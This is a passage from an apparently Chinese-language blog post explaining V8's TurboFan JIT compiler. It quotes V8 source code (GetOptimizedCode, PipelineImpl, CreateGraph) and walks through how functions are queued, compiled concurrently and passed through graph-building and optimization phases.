class="params">(Handle&lt;JSFunction&gt; function,</span></span></span><br><span class="line"><span class="function"><span class="params">                                ConcurrencyMode mode)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (function-&gt;IsOptimized()) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  Isolate* isolate = function-&gt;GetIsolate();</span><br><span class="line">  DCHECK(AllowCompilation::IsAllowed(isolate));</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Start a compilation.</span></span><br><span class="line">  Handle&lt;Code&gt; code;</span><br><span class="line">  <span class="keyword">if</span> (!GetOptimizedCode(function, mode).ToHandle(&amp;code)) &#123;</span><br><span class="line">    <span class="comment">// Optimization failed, get unoptimized code. Unoptimized code must exist</span></span><br><span class="line">    <span class="comment">// already if we are optimizing.</span></span><br><span class="line">    DCHECK(!isolate-&gt;has_pending_exception());</span><br><span class="line">    DCHECK(function-&gt;shared()-&gt;is_compiled());</span><br><span class="line">    DCHECK(function-&gt;shared()-&gt;IsInterpreted());</span><br><span class="line">    code = BUILTIN_CODE(isolate, InterpreterEntryTrampoline);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Install code on closure.</span></span><br><span class="line">  function-&gt;set_code(*code);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Check postconditions on success.</span></span><br><span class="line">  DCHECK(!isolate-&gt;has_pending_exception());</span><br><span class="line">  DCHECK(function-&gt;shared()-&gt;is_compiled());</span><br><span class="line">  DCHECK(function-&gt;is_compiled());</span><br><span class="line">  DCHECK_IMPLIES(function-&gt;HasOptimizationMarker(),</span><br><span class="line">                 function-&gt;IsInOptimizationQueue());</span><br><span class="line">  DCHECK_IMPLIES(function-&gt;HasOptimizationMarker(),</span><br><span class="line">                 function-&gt;ChecksOptimizationMarker());</span><br><span class="line">  DCHECK_IMPLIES(function-&gt;IsInOptimizationQueue(),</span><br><span class="line">                 mode == ConcurrencyMode::kConcurrent);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>GetOptimizedCode</code>的函数代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// v8\src\compiler.cc</span></span><br><span class="line"><span class="function">MaybeHandle&lt;Code&gt; <span class="title">GetOptimizedCode</span><span class="params">(Handle&lt;JSFunction&gt; function,</span></span></span><br><span class="line"><span class="function"><span class="params">                                   ConcurrencyMode mode,</span></span></span><br><span class="line"><span class="function"><span class="params">                                   BailoutId osr_offset = BailoutId::None(),</span></span></span><br><span class="line"><span class="function"><span class="params">                                   JavaScriptFrame* osr_frame = <span class="literal">nullptr</span>)</span> </span>&#123;</span><br><span class="line">  Isolate* isolate = function-&gt;GetIsolate();</span><br><span class="line">  <span class="function">Handle&lt;SharedFunctionInfo&gt; <span class="title">shared</span><span class="params">(function-&gt;shared(), isolate)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Make sure we clear the optimization marker on the function so that we</span></span><br><span class="line">  <span class="comment">// don't try to re-optimize.</span></span><br><span class="line">  <span class="keyword">if</span> (function-&gt;HasOptimizationMarker()) &#123;</span><br><span class="line">    function-&gt;ClearOptimizationMarker();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (isolate-&gt;debug()-&gt;needs_check_on_function_call()) &#123;</span><br><span class="line">    <span class="comment">// Do not optimize when debugger needs to hook into every call.</span></span><br><span class="line">    <span class="keyword">return</span> MaybeHandle&lt;Code&gt;();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  Handle&lt;Code&gt; cached_code;</span><br><span class="line">  <span class="keyword">if</span> (GetCodeFromOptimizedCodeCache(function, osr_offset)</span><br><span class="line">          .ToHandle(&amp;cached_code)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (FLAG_trace_opt) &#123;</span><br><span class="line">      PrintF(<span class="string">"[found optimized code for "</span>);</span><br><span class="line">      function-&gt;ShortPrint();</span><br><span class="line">      <span class="keyword">if</span> (!osr_offset.IsNone()) &#123;</span><br><span class="line">        PrintF(<span class="string">" at OSR AST id %d"</span>, osr_offset.ToInt());</span><br><span class="line">      &#125;</span><br><span class="line">      PrintF(<span class="string">"]\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> cached_code;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Reset profiler ticks, function is no longer considered hot.</span></span><br><span class="line">  DCHECK(shared-&gt;is_compiled());</span><br><span class="line">  function-&gt;feedback_vector()-&gt;set_profiler_ticks(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="function">VMState&lt;COMPILER&gt; <span class="title">state</span><span class="params">(isolate)</span></span>;</span><br><span class="line">  DCHECK(!isolate-&gt;has_pending_exception());</span><br><span class="line">  <span class="function">PostponeInterruptsScope <span class="title">postpone</span><span class="params">(isolate)</span></span>;</span><br><span class="line">  <span class="keyword">bool</span> has_script = shared-&gt;script()-&gt;IsScript();</span><br><span class="line">  <span class="comment">// BUG(5946): This DCHECK is necessary to make certain that we won't</span></span><br><span class="line">  <span class="comment">// tolerate the lack of a script without bytecode.</span></span><br><span class="line">  DCHECK_IMPLIES(!has_script, shared-&gt;HasBytecodeArray());</span><br><span class="line">  <span class="function"><span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;OptimizedCompilationJob&gt; <span class="title">job</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">      compiler::Pipeline::NewCompilationJob(isolate, function, has_script))</span></span>;</span><br><span class="line">  OptimizedCompilationInfo* compilation_info = job-&gt;compilation_info();</span><br><span class="line"></span><br><span class="line">  compilation_info-&gt;SetOptimizingForOsr(osr_offset, osr_frame);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Do not use TurboFan if we need to be able to set break points.</span></span><br><span class="line">  <span class="keyword">if</span> (compilation_info-&gt;shared_info()-&gt;HasBreakInfo()) &#123;</span><br><span class="line">    compilation_info-&gt;AbortOptimization(BailoutReason::kFunctionBeingDebugged);</span><br><span class="line">    <span class="keyword">return</span> MaybeHandle&lt;Code&gt;();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Do not use TurboFan when %NeverOptimizeFunction was applied.</span></span><br><span class="line">  <span class="keyword">if</span> (shared-&gt;optimization_disabled() &amp;&amp;</span><br><span class="line">      shared-&gt;disable_optimization_reason() ==</span><br><span class="line">          BailoutReason::kOptimizationDisabledForTest) &#123;</span><br><span class="line">    compilation_info-&gt;AbortOptimization(</span><br><span class="line">        BailoutReason::kOptimizationDisabledForTest);</span><br><span class="line">    <span class="keyword">return</span> MaybeHandle&lt;Code&gt;();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Do not use TurboFan if optimization is disabled or function doesn't pass</span></span><br><span class="line">  <span class="comment">// turbo_filter.</span></span><br><span class="line">  <span class="keyword">if</span> (!FLAG_opt || !shared-&gt;PassesFilter(FLAG_turbo_filter)) &#123;</span><br><span class="line">    compilation_info-&gt;AbortOptimization(BailoutReason::kOptimizationDisabled);</span><br><span class="line">    <span class="keyword">return</span> MaybeHandle&lt;Code&gt;();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">TimerEventScope&lt;TimerEventOptimizeCode&gt; <span class="title">optimize_code_timer</span><span class="params">(isolate)</span></span>;</span><br><span class="line">  <span class="function">RuntimeCallTimerScope <span class="title">runtimeTimer</span><span class="params">(isolate,</span></span></span><br><span class="line"><span class="function"><span class="params">                                     RuntimeCallCounterId::kOptimizeCode)</span></span>;</span><br><span class="line">  TRACE_EVENT0(TRACE_DISABLED_BY_DEFAULT(<span class="string">"v8.compile"</span>), <span class="string">"V8.OptimizeCode"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// In case of concurrent recompilation, all handles below this point will be</span></span><br><span class="line">  <span class="comment">// allocated in a deferred handle scope that is detached and handed off to</span></span><br><span class="line">  <span class="comment">// the background thread when we return.</span></span><br><span class="line">  base::Optional&lt;CompilationHandleScope&gt; compilation;</span><br><span class="line">  <span class="keyword">if</span> (mode == ConcurrencyMode::kConcurrent) &#123;</span><br><span class="line">    compilation.emplace(isolate, compilation_info);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// All handles below will be canonicalized.</span></span><br><span class="line">  <span class="function">CanonicalHandleScope <span class="title">canonical</span><span class="params">(isolate)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Reopen handles in the new CompilationHandleScope.</span></span><br><span class="line">  compilation_info-&gt;ReopenHandlesInNewHandleScope(isolate);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mode == ConcurrencyMode::kConcurrent) &#123;</span><br><span class="line">    <span class="keyword">if</span> (GetOptimizedCodeLater(job.get(), isolate)) &#123;</span><br><span class="line">      job.release();  <span class="comment">// The background recompile job owns this now.</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">// Set the optimization marker and return a code object which checks it.</span></span><br><span class="line">      function-&gt;SetOptimizationMarker(OptimizationMarker::kInOptimizationQueue);</span><br><span class="line">      DCHECK(function-&gt;IsInterpreted() ||</span><br><span class="line">             (!function-&gt;is_compiled() &amp;&amp; function-&gt;shared()-&gt;IsInterpreted()));</span><br><span class="line">      DCHECK(function-&gt;shared()-&gt;HasBytecodeArray());</span><br><span class="line">      <span class="keyword">return</span> BUILTIN_CODE(isolate, InterpreterEntryTrampoline);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (GetOptimizedCodeNow(job.get(), isolate))</span><br><span class="line">      <span class="keyword">return</span> compilation_info-&gt;code();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (isolate-&gt;has_pending_exception()) isolate-&gt;clear_pending_exception();</span><br><span class="line">  <span class="keyword">return</span> MaybeHandle&lt;Code&gt;();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>函数代码有点长，这里总结一下所做的操作：</p>
<ul>
<li>
<p>如果之前该函数被mark为待优化的，则取消该mark（回想一下<code>--trace-opt</code>的输出）</p>
</li>
<li>
<p>如果debugger需要hook该函数，或者在该函数上下了断点，则不优化该函数，直接返回。</p>
</li>
<li>
<p>如果之前已经优化过该函数（存在OptimizedCodeCache），则直接返回之前优化后的代码。</p>
</li>
<li>
<p>重置当前函数的<code>profiler ticks</code>，使得该函数<strong>不再hot</strong>，这样做的目的是使当前函数不被重复优化。</p>
</li>
<li>
<p>如果设置了一些禁止优化的参数（例如<code>%NeverOptimizeFunction</code>，或者设置了<code>turbo_filter</code>），则取消当前函数的优化。</p>
</li>
<li>
<p>以上步骤完成后则开始优化代码，优化代码也有两种不同的方式，分别是<strong>并行优化</strong>和<strong>非并行优化</strong>。在大多数情况下执行的都是并行优化，因为速度更快。</p>
<p>并行优化会先执行<code>GetOptimizedCodeLater</code>函数，在该函数中判断一些异常条件，例如任务队列已满或者内存占用过高。如果没有异常条件，则执行<code>OptimizedCompilationJob::PrepareJob</code>函数，并继续在更深层次的调用<code>PipelineImpl::CreateGraph</code>来<strong>建图</strong>。</p>
<p>如果<code>GetOptimizedCodeLater</code>函数工作正常，则将会把优化任务<code>Job</code>放入任务队列中。任务队列将安排另一个线程执行优化操作。</p>
<p>另一个线程的栈帧如下，该线程将执行<code>Job-&gt;ExecuteJob</code>并在更深层次调用<code>PipelineImpl::OptimizeGraph</code>来<strong>优化之前建立的图结构</strong>：</p>
<p><img src="/2021/01/v8-turboFan/OptimizeGraph-bt1.png" alt="img"></p>
<p>当另一个线程在优化代码时，主线程可以继续执行其他任务：</p>
<p><img src="/2021/01/v8-turboFan/threads.png" alt="img"></p>
</li>
</ul>
</li>
<li>
<p>综上我们可以得知，JIT最终的优化位于<code>PipelineImpl</code>类中，包括建图以及优化图等</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// v8\src\compiler\pipeline.cc</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PipelineImpl</span> <span class="title">final</span> &#123;</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">explicit</span> <span class="title">PipelineImpl</span><span class="params">(PipelineData* data)</span> : <span class="title">data_</span><span class="params">(data)</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Helpers for executing pipeline phases.</span></span><br><span class="line">  <span class="keyword">template</span> &lt;<span class="keyword">typename</span> Phase&gt;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Run</span><span class="params">()</span></span>;</span><br><span class="line">  <span class="keyword">template</span> &lt;<span class="keyword">typename</span> Phase, <span class="keyword">typename</span> Arg0&gt;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Run</span><span class="params">(Arg0 arg_0)</span></span>;</span><br><span class="line">  <span class="keyword">template</span> &lt;<span class="keyword">typename</span> Phase, <span class="keyword">typename</span> Arg0, <span class="keyword">typename</span> Arg1&gt;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Run</span><span class="params">(Arg0 arg_0, Arg1 arg_1)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Step A. Run the graph creation and initial optimization passes.</span></span><br><span class="line">  <span class="function"><span class="keyword">bool</span> <span class="title">CreateGraph</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// B. Run the concurrent optimization passes.</span></span><br><span class="line">  <span class="function"><span class="keyword">bool</span> <span class="title">OptimizeGraph</span><span class="params">(Linkage* linkage)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Substep B.1. Produce a scheduled graph.</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">ComputeScheduledGraph</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Substep B.2. Select instructions from a scheduled graph.</span></span><br><span class="line">  <span class="function"><span class="keyword">bool</span> <span class="title">SelectInstructions</span><span class="params">(Linkage* linkage)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Step C. Run the code assembly pass.</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">AssembleCode</span><span class="params">(Linkage* linkage)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Step D. Run the code finalization pass.</span></span><br><span class="line">  <span class="function">MaybeHandle&lt;Code&gt; <span class="title">FinalizeCode</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Step E. Install any code dependencies.</span></span><br><span class="line">  <span class="function"><span class="keyword">bool</span> <span class="title">CommitDependencies</span><span class="params">(Handle&lt;Code&gt; code)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">VerifyGeneratedCodeIsIdempotent</span><span class="params">()</span></span>;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">RunPrintAndVerify</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* phase, <span class="keyword">bool</span> untyped = <span class="literal">false</span>)</span></span>;</span><br><span class="line">  <span class="function">MaybeHandle&lt;Code&gt; <span class="title">GenerateCode</span><span class="params">(CallDescriptor* call_descriptor)</span></span>;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">AllocateRegisters</span><span class="params">(<span class="keyword">const</span> RegisterConfiguration* config,</span></span></span><br><span class="line"><span class="function"><span class="params">                         CallDescriptor* call_descriptor, <span class="keyword">bool</span> run_verifier)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function">OptimizedCompilationInfo* <span class="title">info</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">  <span class="function">Isolate* <span class="title">isolate</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">  <span class="function">CodeGenerator* <span class="title">code_generator</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  PipelineData* <span class="keyword">const</span> data_;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="五、初探optimization-phases">五、初探optimization phases</h2>
<h3 id="1-简介">1. 简介</h3>
<p>与LLVM IR的各种Pass类似，turboFan中使用各类phases进行建图、搜集信息以及简化图。</p>
<p>以下是<code>PipelineImpl::CreateGraph</code>函数源码，其中使用了大量的<code>Phase</code>。这些<code>Phase</code>有些用于建图，有些用于优化（在建图时也会执行一部分简单的优化），还有些为接下来的优化做准备：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">PipelineImpl::CreateGraph</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  PipelineData* data = <span class="keyword">this</span>-&gt;data_;</span><br><span class="line"></span><br><span class="line">  data-&gt;BeginPhaseKind(<span class="string">"graph creation"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (info()-&gt;trace_turbo_json_enabled() ||</span><br><span class="line">      info()-&gt;trace_turbo_graph_enabled()) &#123;</span><br><span class="line">    <span class="function">CodeTracer::Scope <span class="title">tracing_scope</span><span class="params">(data-&gt;GetCodeTracer())</span></span>;</span><br><span class="line">    <span class="function">OFStream <span class="title">os</span><span class="params">(tracing_scope.file())</span></span>;</span><br><span class="line">    os &lt;&lt; <span class="string">"---------------------------------------------------\n"</span></span><br><span class="line">       &lt;&lt; <span class="string">"Begin compiling method "</span> &lt;&lt; info()-&gt;GetDebugName().get()</span><br><span class="line">       &lt;&lt; <span class="string">" using Turbofan"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (info()-&gt;trace_turbo_json_enabled()) &#123;</span><br><span class="line">    <span class="function">TurboCfgFile <span class="title">tcf</span><span class="params">(isolate())</span></span>;</span><br><span class="line">    tcf &lt;&lt; AsC1VCompilation(info());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  data-&gt;source_positions()-&gt;AddDecorator();</span><br><span class="line">  <span class="keyword">if</span> (data-&gt;info()-&gt;trace_turbo_json_enabled()) &#123;</span><br><span class="line">    data-&gt;node_origins()-&gt;AddDecorator();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  Run&lt;GraphBuilderPhase&gt;();</span><br><span class="line">  RunPrintAndVerify(GraphBuilderPhase::phase_name(), <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Perform function context specialization and inlining (if enabled).</span></span><br><span class="line">  Run&lt;InliningPhase&gt;();</span><br><span class="line">  RunPrintAndVerify(InliningPhase::phase_name(), <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Remove dead-&gt;live edges from the graph.</span></span><br><span class="line">  Run&lt;EarlyGraphTrimmingPhase&gt;();</span><br><span class="line">  RunPrintAndVerify(EarlyGraphTrimmingPhase::phase_name(), <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Run the type-sensitive lowerings and optimizations on the graph.</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// Determine the Typer operation flags.</span></span><br><span class="line">    Typer::Flags flags = Typer::kNoFlags;</span><br><span class="line">    <span class="keyword">if</span> (is_sloppy(info()-&gt;shared_info()-&gt;language_mode()) &amp;&amp;</span><br><span class="line">        info()-&gt;shared_info()-&gt;IsUserJavaScript()) &#123;</span><br><span class="line">      <span class="comment">// Sloppy mode functions always have an Object for this.</span></span><br><span class="line">      flags |= Typer::kThisIsReceiver;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (IsClassConstructor(info()-&gt;shared_info()-&gt;kind())) &#123;</span><br><span class="line">      <span class="comment">// Class constructors cannot be [[Call]]ed.</span></span><br><span class="line">      flags |= Typer::kNewTargetIsReceiver;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Type the graph and keep the Typer running on newly created nodes within</span></span><br><span class="line">    <span class="comment">// this scope; the Typer is automatically unlinked from the Graph once we</span></span><br><span class="line">    <span class="comment">// leave this scope below.</span></span><br><span class="line">    <span class="function">Typer <span class="title">typer</span><span class="params">(isolate(), data-&gt;js_heap_broker(), flags, data-&gt;graph())</span></span>;</span><br><span class="line">    Run&lt;TyperPhase&gt;(&amp;typer);</span><br><span class="line">    RunPrintAndVerify(TyperPhase::phase_name());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do some hacky things to prepare for the optimization phase.</span></span><br><span class="line">    <span class="comment">// (caching handles, etc.).</span></span><br><span class="line">    Run&lt;ConcurrentOptimizationPrepPhase&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (FLAG_concurrent_compiler_frontend) &#123;</span><br><span class="line">      data-&gt;js_heap_broker()-&gt;SerializeStandardObjects();</span><br><span class="line">      Run&lt;CopyMetadataForConcurrentCompilePhase&gt;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Lower JSOperators where we can determine types.</span></span><br><span class="line">    Run&lt;TypedLoweringPhase&gt;();</span><br><span class="line">    RunPrintAndVerify(TypedLoweringPhase::phase_name());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  data-&gt;EndPhaseKind();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>PipelineImpl::OptimizeGraph</code>函数代码如下，该函数将会对所建立的图进行优化：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">PipelineImpl::OptimizeGraph</span><span class="params">(Linkage* linkage)</span> </span>&#123;</span><br><span class="line">  PipelineData* data = <span class="keyword">this</span>-&gt;data_;</span><br><span class="line"></span><br><span class="line">  data-&gt;BeginPhaseKind(<span class="string">"lowering"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (data-&gt;info()-&gt;is_loop_peeling_enabled()) &#123;</span><br><span class="line">    Run&lt;LoopPeelingPhase&gt;();</span><br><span class="line">    RunPrintAndVerify(LoopPeelingPhase::phase_name(), <span class="literal">true</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    Run&lt;LoopExitEliminationPhase&gt;();</span><br><span class="line">   